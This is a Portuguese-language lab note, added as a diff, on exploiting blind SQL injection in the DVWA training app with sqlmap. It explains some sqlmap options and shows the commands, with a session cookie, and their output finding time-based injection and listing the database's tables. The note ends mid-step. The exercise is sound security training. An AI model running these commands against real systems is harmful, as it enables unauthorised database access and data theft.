@@ -1,0 +1,104 @@
+DVWA = SQL INJECTION BIND 
+
+=========================================================
+
+Falha
+
+Obs: Se aparecer o problema de erro 404 ou algo do tipo siga o caminho para apagar 
+os históricos 
+
+/home/kali/.local/share/sqlmap/output/XXXXXXXXX/
+
+==========================================================
+
+--level
+
+No sqlmap, a opção --level especifica a profundidade de testes que a ferramenta 
+deve realizar durante a injeção SQL. O nível pode variar de 1 a 5:
+
+    Nível 1: Testes básicos, com menos tentativas e técnicas.
+    Nível 2: Testes mais avançados, incluindo algumas técnicas adicionais.
+    Nível 3: Um bom equilíbrio entre profundidade e tempo, com mais técnicas e tentativas.
+    Nível 4: Testes mais intensivos, explorando várias técnicas de injeção.
+    Nível 5: Testes completos e exaustivos, com a maior profundidade e uma gama ampla de técnicas.
+
+
+
+--flush-session
+
+Realmente, o parâmetro --flush-session do sqlmap é utilizado para limpar o cache do sqlmap e forçar 
+a nova detecção de vulnerabilidades na aplicação. Isso é importante porque, como você mencionou, 
+mesmo após a alteração da aplicação para usar EntityManager, o resultado do sqlmap em tela era o mesmo de antes.
+
+
+
+
+================================================================
+
+1 = Para podermos explorar a vulnerabilidade em SQL INJECTION BIND,
+precisamos primeiro informar o cookie para que possamos entrar
+diretamente no link para fazer o teste com o comando abaixo 
+
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://10.60.4.63/DVWA/vulnerabilities/sqli_blind/?id=&Submit=Submit#" --cookie="PHPSESSID=u2itgo1jqi1iab4sv202rr21pj"
+        ___
+       __H__                                                                                            
+ ___ ___[,]_____ ___ ___  {1.8.5#stable}                                                                
+|_ -| . [(]     | .'| . |                                                                               
+|___|_  [)]_|_|_|__,|  _|                                                                               
+      |_|V...       |_|   https://sqlmap.org                                                            
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:07:50 /2024-09-20/
+
+[12:07:50] [WARNING] provided value for parameter 'id' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
+[12:07:50] [INFO] testing connection to the target URL
+[12:07:53] [CRITICAL] page not found (404)
+it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] n
+[12:08:18] [INFO] testing if the target URL content is stable
+[12:08:18] [INFO] target URL content is stable
+[12:08:18] [INFO] testing if GET parameter 'id' is dynamic
+[12:08:18] [WARNING] GET parameter 'id' does not appear to be dynamic
+[12:08:18] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
+[12:08:18] [INFO] testing for SQL injection on GET parameter 'id'
+[12:08:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[12:08:19] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[12:08:19] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                                                            
+[12:08:20] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[12:08:20] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[12:08:20] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[12:08:20] [INFO] testing 'Generic inline queries'
+[12:08:20] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[12:08:21] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[12:08:21] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[12:08:21] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[12:08:31] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes
+
+
+2 = Vamos agora identificar qual o nome da tabela
+
+sqlmap -u "http://10.60.4.63/DVWA/vulnerabilities/sqli_blind/?id=&Submit=Submit#" --cookie="PHPSESSID=mjniugqqmhmpp3kgn0g9g4aeva" --schema --batch 
+
+
+
+
+3 = Com o comando abaixo vamos verificar quantas tabelas existem no banco de dados.
+
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://10.60.4.63/DVWA/vulnerabilities/sqli_blind/?id=&Submit=Submit#" --cookie="PHPSESSID=u2itgo1jqi1iab4sv202rr21pj"  -D dvwa --tables
+
+
+[12:31:32] [INFO] retrieved: 
+[12:31:37] [INFO] adjusting time delay to 1 second due to good response times
+guestbook
+[12:32:08] [INFO] retrieved: users
+Database: dvwa
+[2 tables]
++-----------+
+| guestbook |
+| users     |
++-----------+
+
+3 = 
